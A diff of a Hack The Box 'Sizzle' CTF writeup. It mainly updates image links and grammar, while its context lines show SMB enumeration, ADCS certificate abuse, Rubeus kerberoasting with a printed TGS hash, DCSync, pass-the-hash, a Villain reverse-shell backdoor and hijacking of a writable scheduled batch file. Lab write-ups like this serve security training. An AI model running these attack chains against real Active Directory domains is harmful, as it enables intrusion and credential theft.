@@ -2,7 +2,7 @@
 # HTB (Sizzle - Retired) Writeup
 ### Website: [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Sizzle)
 
-![[Pasted image 20240526132810.png]]
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526132810.png)
 
 
 ## Recon
@@ -159,7 +159,7 @@ do_connect: Connection to HTB.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FO
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-After scanning through each of them to see what I had access too, I came across the ``Department Shares Disk`` which allowed access
+After scanning through each of them to see what I had access to, I came across the ``Department Shares Disk`` which allowed access
 ```bash
 =Department Shares=
   .                                   D        0  Tue Jul  3 16:22:32 2018
@@ -187,7 +187,7 @@ After scanning through each of them to see what I had access too, I came across 
                 7779839 blocks of size 4096. 3357598 blocks available
 ```
 
-the all folders came up empty except ZZ_ARCHIVE, however all the files were just nulled the users folder brought up these names
+all folders came up empty except ZZ_ARCHIVE, however, all the files were just nulled the user's folder brought up these names
 ```amanda amanda_adm bill bob chris henry joe jose lkys37en morgan mrb3n Public```
 
 I was able to write to the Users/Public folder so I attempted to upload a CC 
@@ -211,7 +211,7 @@ ftp> dir
 
 #### HTTP
 I checked the website that is on this box, but it only shows a gif of juicy bacon
-![[Pasted image 20240526104516.png]]
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526104516.png)
 
 #### LDAP - TCP 389 
 I was unable to find anything from any LDAP enumeration.
@@ -271,21 +271,24 @@ using hashcat I found the password to be ``Ashare1972``
 [+] Domain dump finished
 
 ```
-![[Pasted image 20240526113127.png]]
-![[Pasted image 20240526113031.png]]
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113127.png)
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113031.png)
 
 #### Shell
 
-I was able to login to the certsrv page as amanda. 
-![[Pasted image 20240526113434.png]]
+I was able to login to the certsrv page as Amanda. 
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113434.png)
 
 I can create a new certificate
-![[Pasted image 20240526123726.png]]
-![[Pasted image 20240526132941.png]]
-![[Pasted image 20240526133008.png]]
+
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526123726.png)
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526132941.png)
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133008.png)
+
 I can then download the key from the certificate manager and save as a ```.p12``` file and convert it to the files I need 
 
-![[Pasted image 20240526133043.png]]
+
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133043.png)
 
 ```bash
 ──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
@@ -298,7 +301,7 @@ Verifying - Enter PEM pass phrase:
 └─$ openssl pkcs12 -in amanda.p12 -clcerts -nokeys -out amanda.crt Enter Import Password:
 ```
 
-I then Generated a CSR and key using openssl and submitted it back to the ADCS page
+I then Generated a CSR and key using OpenSSL and submitted it back to the ADCS page
 
 ```bash
 ──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
@@ -319,11 +322,11 @@ Email Address []:
 Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: 
 An optional company name []:
 ```
-![[Pasted image 20240526133558.png]]
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133558.png)
 
 #### WinRM Shell 
 
-I used a python script to connect to the shell using the ``CRT`` files I generated (Spiced it up for anyone who wants to use it )
+I used a Python script to connect to the shell using the ``CRT`` files I generated (Spiced it up for anyone who wants to use it )
 
 ```python
 import winrm
@@ -381,9 +384,9 @@ PS htb\amanda@SIZZLE Documents> whoami
 htb\amanda
 ```
 
-Sadly, there was no flag in Amanda's account, so I presume it is in ``MRLKY``'s account, tried just going there but of course that would be too easy.
+Sadly, there was no flag in Amanda's account, so I presume it is in ``MRLKY``'s account, tried just going there but of course, that would be too easy.
 
-I setup a villain session so I could be lazy
+I set a villain session so I could be lazy
 
 ```
 villain -p 6501 -n 4443 -x 8080 -f 8888
@@ -411,9 +414,9 @@ Copied to clipboard!
 ```
 
 
-After having a quick look around to see how to break this jail. I found AppLocker isn't restricting write/Execute access to the /windows/temp folder but I can't see what is inside it 🤨🤨worth a shot I guess.
+After having a quick look around to see how to break this jail, I found AppLocker isn't restricting write/Execute access to the /windows/temp folder but I couldn't see what is inside it 🤨🤨 worth a shot I guess.
 
-I found a tool called [GhostPack/Rubeus:(github.com)](https://github.com/GhostPack/Rubeus)  so built this and places the exe in the /windows/temp folder.
+I found a tool called [GhostPack/Rubeus:(github.com)](https://github.com/GhostPack/Rubeus)  so I built this and placed the exe in the /windows/temp folder.
 
 ```powershell
 PS C:\windows\temp> .\imnotmalware.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
@@ -436,7 +439,7 @@ http/sizzle mrlky CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL 2018-07-
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-was stumped for a good 15 minutes figuring out what was wrong here not gonna lie. 
+I was stumped for a good 15 minutes figuring out what was wrong here not gonna lie. 
 
 turns out the date was wrong by about 10 minutes. (shocker), probably should've googled it.
 
@@ -452,7 +455,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1
 ```
 
-stuck the hash in hashcat and got the very secure password.
+stuck the hash in Hashcat and got the very secure password.
 
 ```
 
@@ -469,7 +472,7 @@ Dictionary cache hit:
 Seems like MRLKY likes Football ``Football#7`` do love a good user flag.
 
 Opened up Bloodhound and grabbed details from the server, MRLKY can use ``GetChanges`` and ``GetChangesAll`` from the domain
-![[Pasted image 20240526141512.png]]
+![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526141512.png)
 
 Skipping all the boring stuff - I was able to use ``Impacket-SecretsDump`` to get domain credentials for the Administrator and use crackmap to pass the hash and wmiexec to get a shell 
 
@@ -497,13 +500,13 @@ htb\administrator
 ### Root: 7ae3c7c5fef8b***
 
 
-## Unintended routes? 
+## After going through the pain and suffering of the above. 
 
 ### Clean.bat File
 
-The Admin Home directory permissions allows Amanda to read direct folders in this case ``C:\Users\Administrator\Desktop`` but not ``C:\Users\Administrator\`` or the root.txt file. 
+The Admin Home directory permissions allow Amanda to read direct folders in this case ``C:\Users\Administrator\Desktop`` but not ``C:\Users\Administrator\`` or the root.txt file. 
 
-In the Administrators Document folder there is a ``clean.bat`` file which clears the ``C:\Department Shares\Users\Public`` folder and seems to be scheduled to run ever couple of minutes.
+In the Administrators Document folder, there is a ``clean.bat`` file that clears the ``C:\Department Shares\Users\Public`` folder and seems to be scheduled to run every couple of minutes.
 
 Turns out. Good ole' Mandy has full control over this file
 
@@ -542,14 +545,9 @@ Copied to clipboard!
 [Shell] Backdoor session established on 10.129.223.33
 Villain > backdoors
 <<Snip>
-Villain > shell
-
-Interactive pseudo-shell activated.
-Press Ctro + C or type "exit" to deactivate
-
 
 PS C:\Windows\system32 > whoami
 htb\administrator
 ```
 
-I could then just visit the Desktop of all users which got the User and Root flag.
+I could then just visit the Desktop of all users that got the User and Root flag.
